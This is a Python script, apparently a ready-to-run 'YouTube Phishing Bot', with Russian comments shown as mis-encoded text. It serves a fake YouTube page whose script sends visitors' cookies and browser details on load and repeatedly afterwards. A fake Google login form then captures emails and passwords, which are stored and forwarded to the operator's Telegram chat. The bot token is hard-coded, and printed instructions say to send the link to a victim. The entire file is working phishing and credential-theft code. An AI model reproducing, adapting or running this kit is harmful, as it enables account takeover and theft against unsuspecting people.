import logging
import json
import re
import uuid
import os
import time
import sys
import sqlite3
import random
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs
import base64
import html

# Telegram —á–µ—Ä–µ–∑ requests
import requests

# –î–ª—è HTTP —Å–µ—Ä–≤–µ—Ä–∞ (–≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –≤ Python)
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# ========== –ù–ê–°–¢–†–û–ô–ö–ò ==========
BOT_TOKEN = "8342575399:AAFetGCZwKYOe4fwuXLkWsn6N3Q0VVEHGTs"  # –ü–æ–ª—É—á–∏—Ç–µ —É @BotFather
ADMIN_ID = "1709490182"       # –í–∞—à ID –≤ Telegram
PORT = 5000  # –ò—Å–ø–æ–ª—å–∑—É–µ–º –¥—Ä—É–≥–æ–π –ø–æ—Ä—Ç

# Telegram API URL
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== TELEGRAM –ë–û–¢ ==========
class SimpleTelegramBot:
    def __init__(self, token: str, admin_id: str):
        self.token = token
        self.admin_id = admin_id
        self.api_url = f"https://api.telegram.org/bot{token}"
    
    def send_message(self, chat_id: str, text: str, parse_mode: str = "HTML") -> bool:
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram"""
        try:
            url = f"{self.api_url}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            }
            
            response = requests.post(url, json=data, timeout=10)
            return response.status_code == 200
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
            return False
    
    def send_photo(self, chat_id: str, photo_url: str, caption: str = "") -> bool:
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ñ–æ—Ç–æ –ø–æ URL"""
        try:
            url = f"{self.api_url}/sendPhoto"
            data = {
                "chat_id": chat_id,
                "photo": photo_url,
                "caption": caption
            }
            
            response = requests.post(url, json=data, timeout=10)
            return response.status_code == 200
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ: {e}")
            return False

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –±–æ—Ç–∞
bot = SimpleTelegramBot(BOT_TOKEN, ADMIN_ID)

# ========== –ë–ê–ó–ê –î–ê–ù–ù–´–• ==========
class SimpleDatabase:
    def __init__(self):
        self.conn = sqlite3.connect('youtube.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                youtube_url TEXT,
                youtube_id TEXT,
                created_at TEXT,
                clicks INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS data (
                id TEXT PRIMARY KEY,
                link_id TEXT,
                timestamp TEXT,
                ip TEXT,
                user_agent TEXT,
                cookies TEXT,
                logins TEXT,
                passwords TEXT
            )
        ''')
        
        self.conn.commit()
    
    def add_link(self, youtube_url: str, youtube_id: str) -> str:
        """–î–æ–±–∞–≤–ª—è–µ—Ç —Å—Å—ã–ª–∫—É –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –µ—ë ID"""
        link_id = str(uuid.uuid4())[:8]
        
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO links (id, youtube_url, youtube_id, created_at)
            VALUES (?, ?, ?, ?)
        ''', (link_id, youtube_url, youtube_id, datetime.now().isoformat()))
        
        self.conn.commit()
        return link_id
    
    def add_click(self, link_id: str):
        """–£–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç —Å—á–µ—Ç—á–∏–∫ –∫–ª–∏–∫–æ–≤"""
        cursor = self.conn.cursor()
        cursor.execute('UPDATE links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
        self.conn.commit()
    
    def add_data(self, link_id: str, ip: str, user_agent: str, 
                cookies: List[Dict], logins: List[Dict], passwords: List[Dict]):
        """–î–æ–±–∞–≤–ª—è–µ—Ç —Å–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ"""
        data_id = str(uuid.uuid4())[:8]
        
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO data (id, link_id, timestamp, ip, user_agent, cookies, logins, passwords)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data_id,
            link_id,
            datetime.now().isoformat(),
            ip,
            user_agent,
            json.dumps(cookies),
            json.dumps(logins),
            json.dumps(passwords)
        ))
        
        self.conn.commit()
        return data_id
    
    def get_link_info(self, link_id: str) -> Optional[Dict]:
        """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å—Å—ã–ª–∫–µ"""
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM links WHERE id = ?', (link_id,))
        row = cursor.fetchone()
        
        if row:
            columns = [desc[0] for desc in cursor.description]
            return dict(zip(columns, row))
        return None
    
    def get_stats(self) -> Dict:
        """–ü–æ–ª—É—á–∞–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É"""
        cursor = self.conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM links')
        total_links = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(clicks) FROM links')
        total_clicks = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM data')
        total_data = cursor.fetchone()[0]
        
        return {
            'total_links': total_links,
            'total_clicks': total_clicks,
            'total_data': total_data
        }

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º –±–∞–∑—É
db = SimpleDatabase()

# ========== YouTube –§–£–ù–ö–¶–ò–ò ==========
def extract_video_id(url: str) -> str:
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç ID –≤–∏–¥–µ–æ –∏–∑ YouTube URL"""
    patterns = [
        r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
        r'v=([a-zA-Z0-9_-]{11})'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, url)
        if match:
            return match.group(1)
    
    return "dQw4w9WgXcQ"  # Rick Roll

def generate_youtube_page(youtube_id: str, link_id: str) -> str:
    """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç HTML —Å—Ç—Ä–∞–Ω–∏—Ü—É —Å YouTube –≤–∏–¥–µ–æ"""
    video_info = {
        'title': random.choice([
            "–ù–û–í–û–ï –í–ò–î–ï–û! –°–ú–û–¢–†–ò–¢–ï –°–ï–ô–ß–ê–°",
            "–≠–¢–û –ò–ó–ú–ï–ù–ò–¢ –í–ê–®–£ –ñ–ò–ó–ù–¨",
            "–°–ï–ö–†–ï–¢–ù–´–ô –ö–û–ù–¢–ï–ù–¢",
            "–û–ë–ó–û–† –ù–û–í–û–ô –¢–ï–•–ù–ò–ö–ò"
        ]),
        'views': f"{random.randint(1000, 1000000):,}".replace(',', ' '),
        'likes': f"{random.randint(100, 10000):,}".replace(',', ' ')
    }
    
    return f'''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #0f0f0f;
            color: white;
            font-family: Arial, sans-serif;
        }}
        .container {{
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }}
        .player-container {{
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
            background: #000;
            border-radius: 10px;
            margin-bottom: 20px;
        }}
        .player-container iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }}
        .video-title {{
            font-size: 24px;
            font-weight: bold;
            margin: 20px 0 10px;
        }}
        .video-info {{
            color: #aaa;
            margin-bottom: 20px;
        }}
        .login-prompt {{
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            border: 1px solid #333;
        }}
        .login-btn {{
            background: #cc0000;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }}
        .login-btn:hover {{
            background: #ff0000;
        }}
        .login-form {{
            display: none;
            background: #1a1a1a;
            padding: 30px;
            border-radius: 10px;
            margin: 20px 0;
        }}
        .login-form input {{
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #2d2d2d;
            border: 1px solid #444;
            border-radius: 5px;
            color: white;
            font-size: 16px;
        }}
        .login-form button {{
            width: 100%;
            padding: 15px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="player-container">
            <iframe 
                src="https://www.youtube.com/embed/{youtube_id}?autoplay=1&controls=1" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                allowfullscreen>
            </iframe>
        </div>
        
        <h1 class="video-title">{video_info['title']}</h1>
        <div class="video-info">
            {video_info['views']} –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ ‚Ä¢ {video_info['likes']} –ª–∞–π–∫–æ–≤
        </div>
        
        <div class="login-prompt" id="loginPrompt">
            <h3>üîê –í–æ–π–¥–∏—Ç–µ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è</h3>
            <p>–î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –≤–∏–¥–µ–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</p>
            <button class="login-btn" onclick="showLoginForm()">–í–û–ô–¢–ò –í –ê–ö–ö–ê–£–ù–¢</button>
        </div>
        
        <div class="login-form" id="loginForm">
            <h3>–í—Ö–æ–¥ –≤ Google</h3>
            <input type="email" id="email" placeholder="Email" autocomplete="email">
            <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å" autocomplete="current-password">
            <button onclick="submitLogin()">–í–û–ô–¢–ò</button>
        </div>
    </div>
    
    <script>
        const linkId = "{link_id}";
        
        // –§—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        function collectData() {{
            const data = {{
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                cookies: document.cookie,
                screen: {{
                    width: screen.width,
                    height: screen.height
                }},
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            }};
            
            return data;
        }}
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
        function sendData(type = 'page_load') {{
            const data = collectData();
            
            fetch('/collect', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    link_id: linkId,
                    type: type,
                    data: btoa(JSON.stringify(data))
                }})
            }}).catch(() => {{}});
        }}
        
        // –ü–æ–∫–∞–∑–∞—Ç—å —Ñ–æ—Ä–º—É –≤—Ö–æ–¥–∞
        function showLoginForm() {{
            document.getElementById('loginPrompt').style.display = 'none';
            document.getElementById('loginForm').style.display = 'block';
            sendData('login_click');
        }}
        
        // –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥–∏–Ω
        function submitLogin() {{
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const loginData = collectData();
            loginData.email = email;
            loginData.password = password;
            
            fetch('/login', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    link_id: linkId,
                    email: email,
                    password: password,
                    data: btoa(JSON.stringify(loginData))
                }})
            }});
            
            alert('–í—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω! –ü—Ä–æ–¥–æ–ª–∂–∞–µ–º –ø—Ä–æ—Å–º–æ—Ç—Ä...');
            document.getElementById('loginForm').style.display = 'none';
        }}
        
        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', () => {{
            sendData('page_load');
            
            // –ê–≤—Ç–æ–ø–æ–∫–∞–∑ —Ñ–æ—Ä–º—ã —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(showLoginForm, 5000);
            
            // –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏–π —Å–±–æ—Ä
            setInterval(() => sendData('periodic'), 30000);
        }});
        
        // –°–±–æ—Ä –ø—Ä–∏ —É—Ö–æ–¥–µ
        window.addEventListener('beforeunload', () => {{
            sendData('page_exit');
        }});
    </script>
</body>
</html>
'''

# ========== HTTP –°–ï–†–í–ï–† ==========
class YouTubeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ GET –∑–∞–ø—Ä–æ—Å–æ–≤"""
        try:
            parsed = urlparse(self.path)
            query = parse_qs(parsed.query)
            
            # –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞
            if parsed.path == '/':
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                
                html_content = '''
                <!DOCTYPE html>
                <html>
                <head>
                    <title>YouTube Link Generator</title>
                    <style>
                        body { font-family: Arial; padding: 20px; }
                        .container { max-width: 600px; margin: 0 auto; }
                        input, button { padding: 10px; margin: 5px; width: 100%; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>üé¨ –°–æ–∑–¥–∞—Ç—å YouTube —Å—Å—ã–ª–∫—É</h1>
                        <p>–í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ:</p>
                        <form action="/create" method="GET">
                            <input type="text" name="url" placeholder="https://youtube.com/watch?v=..." required>
                            <button type="submit">–°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É</button>
                        </form>
                    </div>
                </body>
                </html>
                '''
                self.wfile.write(html_content.encode('utf-8'))
            
            # –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∏
            elif parsed.path == '/create':
                youtube_url = query.get('url', [''])[0]
                
                if not youtube_url:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'Error: No URL provided')
                    return
                
                youtube_id = extract_video_id(youtube_url)
                link_id = db.add_link(youtube_url, youtube_id)
                
                # –°–æ–∑–¥–∞–µ–º —Ñ–∏—à–∏–Ω–≥ URL
                phishing_url = f"http://{self.server.server_address[0]}:{self.server.server_address[1]}/watch?v={youtube_id}&id={link_id}"
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                
                html_content = f'''
                <!DOCTYPE html>
                <html>
                <head>
                    <title>–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!</title>
                    <style>
                        body {{ font-family: Arial; padding: 20px; }}
                        .success {{ background: #d4edda; padding: 20px; border-radius: 5px; }}
                        .url-box {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; }}
                    </style>
                </head>
                <body>
                    <h1>‚úÖ –°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!</h1>
                    
                    <div class="success">
                        <h3>–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–µ –≤–∏–¥–µ–æ:</h3>
                        <p>{youtube_url}</p>
                        
                        <h3>–í–∞—à–∞ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫–∞:</h3>
                        <div class="url-box" id="url">{phishing_url}</div>
                        
                        <button onclick="copyUrl()">üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É</button>
                        <a href="{phishing_url}" target="_blank"><button>üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É</button></a>
                    </div>
                    
                    <script>
                        function copyUrl() {{
                            const url = document.getElementById('url').innerText;
                            navigator.clipboard.writeText(url);
                            alert('–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞!');
                        }}
                    </script>
                </body>
                </html>
                '''
                self.wfile.write(html_content.encode('utf-8'))
            
            # –°—Ç—Ä–∞–Ω–∏—Ü–∞ —Å –≤–∏–¥–µ–æ
            elif parsed.path == '/watch':
                youtube_id = query.get('v', ['dQw4w9WgXcQ'])[0]
                link_id = query.get('id', [''])[0]
                
                if link_id:
                    db.add_click(link_id)
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                
                html_content = generate_youtube_page(youtube_id, link_id)
                self.wfile.write(html_content.encode('utf-8'))
            
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'404 Not Found')
                
        except Exception as e:
            logger.error(f"GET error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_POST(self):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ POST –∑–∞–ø—Ä–æ—Å–æ–≤"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            link_id = data.get('link_id', '')
            
            if self.path == '/collect':
                # –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
                ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', '')
                
                # –î–µ–∫–æ–¥–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ
                encoded_data = data.get('data', '')
                try:
                    json_data = json.loads(base64.b64decode(encoded_data).decode('utf-8'))
                except:
                    json_data = {}
                
                # –ò–∑–≤–ª–µ–∫–∞–µ–º cookies
                cookies = []
                if 'cookies' in json_data:
                    for cookie_str in json_data['cookies'].split(';'):
                        if '=' in cookie_str:
                            name, value = cookie_str.strip().split('=', 1)
                            cookies.append({'name': name, 'value': value})
                
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ
                data_id = db.add_data(link_id, ip, user_agent, cookies, [], [])
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
                stats = db.get_stats()
                message = f"""
üîê *–ù–û–í–´–ï –î–ê–ù–ù–´–ï!*

üìå *–°–µ—Å—Å–∏—è:* `{data_id}`
üîó *–°—Å—ã–ª–∫–∞:* `{link_id}`
üïí *–í—Ä–µ–º—è:* {datetime.now().strftime('%H:%M:%S')}
üåê *IP:* `{ip}`
üë§ *–ë—Ä–∞—É–∑–µ—Ä:* {user_agent[:50]}...

üìä *–°–æ–±—Ä–∞–Ω–æ:*
‚Ä¢ Cookies: {len(cookies)}

üìà *–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:*
‚Ä¢ –í—Å–µ–≥–æ —Å—Å—ã–ª–æ–∫: {stats['total_links']}
‚Ä¢ –í—Å–µ–≥–æ –∫–ª–∏–∫–æ–≤: {stats['total_clicks']}
‚Ä¢ –í—Å–µ–≥–æ –¥–∞–Ω–Ω—ã—Ö: {stats['total_data']}

üí° *–ß—Ç–æ –¥–µ–ª–∞—Ç—å:*
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç—Ç—É —Å—Å—ã–ª–∫—É –¥–ª—è –≤—Ö–æ–¥–∞: /watch?v=...&id={link_id}
‚Ä¢ –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ
"""
                
                bot.send_message(ADMIN_ID, message)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
            
            elif self.path == '/login':
                # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ª–æ–≥–∏–Ω–∞
                email = data.get('email', '')
                password = data.get('password', '')
                ip = self.client_address[0]
                
                message = f"""
üîë *–ù–û–í–´–ï –£–ß–ï–¢–ù–´–ï –î–ê–ù–ù–´–ï!*

üìå *–°—Å—ã–ª–∫–∞:* `{link_id}`
üìß *Email:* `{email}`
üîê *–ü–∞—Ä–æ–ª—å:* `{password}`
üåê *IP:* `{ip}`
üïí *–í—Ä–µ–º—è:* {datetime.now().strftime('%H:%M:%S')}

‚ö†Ô∏è *–í–ù–ò–ú–ê–ù–ò–ï:* –°–æ—Ö—Ä–∞–Ω–∏—Ç–µ —ç—Ç–∏ –¥–∞–Ω–Ω—ã–µ!
"""
                
                bot.send_message(ADMIN_ID, message)
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            
            else:
                self.send_response(404)
                self.end_headers()
                
        except Exception as e:
            logger.error(f"POST error: {e}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        """–û—Ç–∫–ª—é—á–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ"""
        pass

# ========== –ó–ê–ü–£–°–ö –°–ï–†–í–ï–†–ê ==========
def run_server(port: int = 5000):
    """–ó–∞–ø—É—Å–∫–∞–µ—Ç HTTP —Å–µ—Ä–≤–µ—Ä"""
    server = HTTPServer(('0.0.0.0', port), YouTubeHandler)
    
    print(f"üåê –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É {port}")
    print(f"üì± –î–æ—Å—Ç—É–ø –ø–æ –∞–¥—Ä–µ—Å—É: http://localhost:{port}")
    print(f"üì± –î–ª—è –¥–æ—Å—Ç—É–ø–∞ —Å –¥—Ä—É–≥–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –≤–∞—à –ª–æ–∫–∞–ª—å–Ω—ã–π IP")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nüõë –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
        server.server_close()

# ========== –û–°–ù–û–í–ù–ê–Ø –ü–†–û–ì–†–ê–ú–ú–ê ==========
def main():
    """–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    print("=" * 50)
    print("ü§ñ YouTube Phishing Bot - Pythonista iOS")
    print("=" * 50)
    print()
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–∫–µ–Ω
    if BOT_TOKEN == "–í–ê–®_–¢–û–ö–ï–ù_–ë–û–¢–ê":
        print("‚ùå –û–®–ò–ë–ö–ê: –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω BOT_TOKEN!")
        print("–ü–æ–ª—É—á–∏—Ç–µ —É @BotFather –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –∫–æ–¥")
        sys.exit(1)
    
    print(f"‚úÖ –ë–æ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω")
    print(f"üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: {ADMIN_ID}")
    print(f"üåê –ü–æ—Ä—Ç —Å–µ—Ä–≤–µ—Ä–∞: {PORT}")
    print()
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    bot.send_message(
        ADMIN_ID,
        "ü§ñ *YouTube Phishing Bot –∑–∞–ø—É—â–µ–Ω!*\n\n"
        "üåê –°–µ—Ä–≤–µ—Ä –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ\n"
        f"üì° –ü–æ—Ä—Ç: {PORT}\n\n"
        "üí° *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*\n"
        "1. –û—Ç–∫—Ä–æ–π—Ç–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ: http://localhost:5000\n"
        "2. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ\n"
        "3. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É\n"
        "4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ\n"
        "5. –î–∞–Ω–Ω—ã–µ –ø—Ä–∏–¥—É—Ç —Å—é–¥–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏"
    )
    
    print("üí° –ò–ù–°–¢–†–£–ö–¶–ò–Ø:")
    print("1. –û—Ç–∫—Ä–æ–π—Ç–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ: http://localhost:5000")
    print("2. –í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ")
    print("3. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–∫—É")
    print("4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ")
    print("5. –î–∞–Ω–Ω—ã–µ –ø—Ä–∏–¥—É—Ç –≤ Telegram")
    print()
    print("‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!")
    print("=" * 50)
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —Å–µ—Ä–≤–µ—Ä
    run_server(PORT)

if __name__ == '__main__':
    main()
